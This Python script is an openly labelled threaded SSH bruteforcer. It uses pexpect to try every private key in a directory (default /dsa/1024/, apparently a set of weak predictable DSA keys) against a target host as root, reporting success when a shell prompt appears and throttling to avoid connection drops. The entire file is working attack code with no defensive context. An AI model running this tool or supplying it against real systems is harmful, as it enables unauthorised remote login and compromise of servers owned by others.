import pexpect

import argparse

import os

from threading import *

MAXCONS = 10

connection_lock =BoundedSemaphore(value=MAXCONS)

STOP = False
FAILURES = 0

def connect(user, host, keyfile, release):
    global STOP
    global FAILURES

    try:
        denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        conn_str = 'ssh ' + user + \
            '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, denied,\
                            ssh_newkey, conn_closed, '$', '#'])

        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)

        elif ret == 3:
            print ('[-] Connection Closed By Remote Host')
            FAILURES += 1

        elif ret > 3:
            print('[+] Success : ' + str(keyfile))
            STOP = True

    finally:
        if release:
            connection_lock.release()


def main():

    parser = argparse.ArgumentParser(
        description=u'Threaded SSH bruteforcer'
    )

    parser.add_argument(
        u'-H',
        dest='target_host',
        default='127.0.0.1',
        help=u'The IP or DNS of the target.'
    )

    parser.add_argument(
        u'-u',
        dest='username',
        default='root',
        help=u'The username of the target you wish to exploit'
    )

    parser.add_argument(
        u'-d',
        dest='directory',
        default='/dsa/1024/',
        help=u'The directory containing the RSA files'
    )

    arguments = parser.parse_args()

    uname = arguments.username
    target = arguments.target_host
    dir = arguments.directory

    if not os.path.isdir(dir):
        parser.print_help()
        raise SystemExit

    for filename in os.listdir(dir):
        if STOP:
            print('[+] Exiting: Key Found.')
            raise SystemExit

        if FAILURES > 10:
            print('[!] Exiting: '+\
                  'Too Many Connections Closed By Remote Host')
            print('[!] Adjust number of simultaneous threads!')
            raise SystemExit

        connection_lock.acquire()
        fullpath = os.path.join(dir, filename)
        print('[-] Testing keyfile: ' + str(fullpath))
        t = Thread(target=connect, args=(uname, target, fullpath, True))
        child = t.start()


if __name__ == '__main__':
    main()